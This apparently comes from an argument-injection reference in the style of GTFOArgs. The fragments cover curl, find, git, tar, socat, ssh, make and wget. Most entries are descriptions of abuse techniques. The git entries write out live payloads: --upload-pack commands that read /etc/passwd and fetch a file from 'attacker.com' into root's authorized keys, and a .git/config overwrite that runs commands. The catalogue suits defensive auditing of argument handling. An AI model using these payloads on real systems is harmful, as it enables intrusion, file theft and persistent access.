examples.description: Argument injection: spawn interactive shell: Can be used to execute arbitrary commands on a system and spawn shells.
Argument injection: execute arbitrary command: Can be used to execute arbitrary commands on a system.
Argument injection: execute arbitrary command: The file must exist and command will be executed as many rows there are in the file.
Argument injection: execute arbitrary command: If spaces cannot be inserted, we can use `sprintf(%c,32)` to emulate them.
Argument injection: read local file: Read an arbitrary file.
Argument injection: read local file: Print the contents of multiple files.
Argument injection: write to local file: Write to an arbitrary file

parameters.name: exec-expression
parameters.description: Execute shell command via system() or print|/bin/sh

parameters.name: getline-variable
parameters.description: Read file content into variable via getline < file

examples.description: Argument injection: upload file: Send a local file to a remote server in a POST request.
Argument injection: upload file: Send a local file to a remote server in a POST request.
Argument injection: upload file: Send a local file to a remote server in a POST request.
Argument injection: read local file: Read local files by using the file:// schema.
Argument injection: download file: Downloads a file to a destination.
Argument injection: write to local file: Uses file-read to effectively copy files.
Argument injection: read local file: Read an arbitrary file by specifying it as a batch file. Note that this will leak lines of the file read as outbound DNS lookups.

Argument injection: read local file: Read an arbitrary file by specifying it as a magic file. This will
result in errors containing the lines of the file. The argument parsing
done by file also means this can be specified as a single argument.
Argument injection: spawn interactive shell: Can be used to execute arbitrary commands on a system and spawn shells either indirectly
Argument injection: spawn interactive shell: or directly.
Argument injection: execute arbitrary command: Can be used to execute arbitrary commands on a system.
Argument injection: read local file: Reading of files is possible by executing cat.

Argument injection: write to local file: Find has various capabilities to write to files and it is recommended to read the manual for more details, especially its fprintf and 'UNUSUAL FILENAMES' sections.

parameters.name: exec
parameters.description: Execute a command on each matched file

parameters.name: ok
parameters.description: Like -exec but prompts before each execution

parameters.name: execdir
parameters.description: Execute command from the directory of the matched file

parameters.name: fprintf
parameters.description: Print formatted output to a file

parameters.name: perm
parameters.description: Find files with specific permissions (e.g., /4000 for SUID)

parameters.name: user
parameters.description: Find files owned by a specific user

parameters.name: mmin
parameters.description: Find files modified N minutes ago

parameters.name: size
parameters.description: Find files of a specific size

examples.description: Argument injection: execute arbitrary command: The --open-files-in-pager flag can be used to run arbitrary commands. Any of the following should work.

Argument injection: execute arbitrary command: The --upload-pack flag can be used in multiple contexts. Note that the output is not necessarily shown (but you can route the output to stderr and possibly view it, by using `>&2`). ls-remote is the only example which does not require the command to be run within a tracked folder. Any of the following should work.
examples.command:
git ls-remote --upload-pack='uname -a > /tmp/file #' main
git fetch origin --upload-pack='cat /etc/passwd >&2 ;'
git pull origin --upload-pack='wget attacker.com/key -O /root/.ssh/authorized-keys #'

examples.description: Argument injection: execute arbitrary command: The `--upload-pack` / `-u` flag on `git clone` can execute commands. A colon in the positional argument helps trigger execution.

Argument injection: execute arbitrary command: This method takes advantage of one of the file-write methods to overwrite `.git/config`. Officially, this is probably out of scope of GTFOArgs, but it is included anyways. `id` is executed and written to `/tmp/fsmonitor` in this example.
examples.command:
git commit --allow-empty -m 'fsmonitor = "id>/tmp/fsmonitor"'
git commit --allow-empty -m '[core]'
git log --max-count=2 --pretty=format:"%s" --output=./.git/config
git status

examples.description: Argument injection: read local file: It is common to use `git diff` to compare a single file to a different version of itself in history. The `--no-index` flag can be used to effectively turn `git diff` into normal `diff` against another file _within the git repository_ (but not necessarily tracked).
Argument injection: read local file: If you are reading a file outside of the git directory, you can use `git diff` against `/dev/null`.
Argument injection: read local file: The `--file` flag on `git tag` reads a file's contents into the tag message. Retrieve it with `git cat-file`.
examples.command:
git tag '--file=/etc/passwd' main
git cat-file -p refs/tags/main

examples.description: Argument injection: write to local file: Outputs the most recent changelog to an arbitrary file. Note that this also contains the commit information.
Argument injection: write to local file: Outputs the first line of the most recent commit message to an arbitrary file.
Argument injection: write to local file: Can be used to overwrite a file, or create an empty file.
Argument injection: write to local file: Archives the repository to an arbitrary output file.
Argument injection: write to local file: The undocumented `--output` flag on `git diff` can truncate or create files.

parameters.name: worktree-add
parameters.description: Add a worktree with a specific path

parameters.name: config-path
parameters.description: Set a config value pointing to a script path

parameters.name: hooks-path
parameters.description: Override hooks directory path

examples.description: Argument injection: spawn interactive shell: Can be used to execute arbitrary commands on a system and spawn shells either indirectly

parameters.name: eval-expression
parameters.description: Evaluate arbitrary make expression via $(shell cmd)

parameters.name: include-file
parameters.description: Include an arbitrary file into the Makefile parse

examples.description: Argument injection: read local file: The command leverages socats ability to relay data, reading arbitary file by opening it in read-only mode.
Argument injection: spawn interactive shell: The exec argument runs an arbitrary command and spawn a shell.
Argument injection: execute arbitrary command: The exec argument runs an arbitrary command.
Argument injection: spawn interactive shell: Spawn interactive shell on client. Does not require a successful connection.
Argument injection: spawn interactive shell: Spawn interactive shell on client. Requires a successful connection towards `host`.
Argument injection: upload file: Sends a local file (`/etc/passwd`) to a remote SSH server and saves it in a location (`/tmp/out`).
Argument injection: download file: Retrieves a remote file from an SSH server (`/tmp/infile`) and saves it to a local destination (`/root/.ssh/authorized_keys`).
Argument injection: read local file: Reads a file and outputs it in an error message.
Argument injection: execute arbitrary command: Does not require a successful connection.

Argument injection: spawn interactive shell: The --to-command is normally used to pipe extracted files to a command. This can be used to run arbitrary commands on a host. The file must be a valid archive file.

Argument injection: spawn interactive shell: Similar to the above, but at a previous stage in the extraction. A valid archive is not required. This functionality can be abused in various ways for file-read and file-write (see below).

Argument injection: spawn interactive shell: GNU tar specifc. The -F / --info-script= / --new-volume-script= arguments will run a command at volume rotation. Other flags used are to force frequent rotation.

Argument injection: execute arbitrary command: During archive creation, `--checkpoint` and `--checkpoint-action` can execute arbitrary commands. Requires injecting two arguments and a positional argument.

Argument injection: upload file: This only works for GNU tar. Create tar archive and send it via SSH to a remote location. The attacker box must have the `rmt` utility installed (it should be present by default in Debian-like distributions).

Argument injection: download file: GNU tar has remote archive capabilities, which can be used to download and extract remote archives. The remote machine should have the `rmt` utility installed and configured.
Argument injection: read local file: The --use-compress-program flag can be abused to read files.

parameters.name: checkpoint
parameters.description: Execute command at checkpoint during archive creation (GTFO abuse)

parameters.name: checkpoint-action
parameters.description: Action to execute at checkpoint (e.g., exec=command)

parameters.name: use-compress-program
parameters.description: External compression program (abuse for shell/file-read)

parameters.name: to-command
parameters.description: Pipe extracted files to a command

parameters.name: rsh-command
parameters.description: Remote shell command for SSH-based archive transfer

parameters.name: record-size
parameters.description: Set record size for tape operations

parameters.name: info-script
parameters.description: Run script at volume rotation

parameters.name: new-volume-script
parameters.description: Alias for info-script

examples.description: Argument injection: execute arbitrary command: Can be used to execute any command or file on a system, but without any arguments, and without stdout/stderr. This can be useful if you are able to write an executable to the server beforehand. The example here invokes /sbin/reboot.
Argument injection: upload file: Send a local file to a remote server in a POST request. Note that the file will be sent as-is.
Argument injection: read local file: Read local files by importing the file as URIs to be retrieved. The content of the file will be displayed as error messages.
Argument injection: write to local file: Reads local data and writes the output to a file. This is only suitable for displaying non-binary files, as the output is an error-log.
Argument injection: download file: Downloads a remote file via an HTTP GET request and saves it to a specific location.
